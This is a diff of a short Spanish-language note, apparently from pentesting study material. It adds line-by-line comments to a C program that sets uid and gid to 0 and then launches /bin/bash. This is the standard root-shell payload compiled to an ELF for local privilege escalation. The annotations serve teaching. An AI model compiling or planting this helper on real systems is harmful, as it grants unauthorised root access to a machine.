@@ -9,9 +9,9 @@ Generar fichero en C para despues compilarlo en un ELF.
 #include <unistd.h>
 
 int main() {
-    setuid(0);
-    setgid(0);
-    execl("/bin/bash", "bash", NULL);
+    setuid(0); //Trata de forzar que el uid sea 0, es decir el de root (requiere privilegios)
+    setgid(0); //Trata de forzar que el grupo sea 0, es decir el de root (requiere privilegios)
+    execl("/bin/bash", "bash", NULL); //Sustituye el PID actual y correo el fichero "/bin/bash" llamandolo "bash", sí es una ruta relativa ira a leer buscando "PATH"
     return 0;
 }
 ```
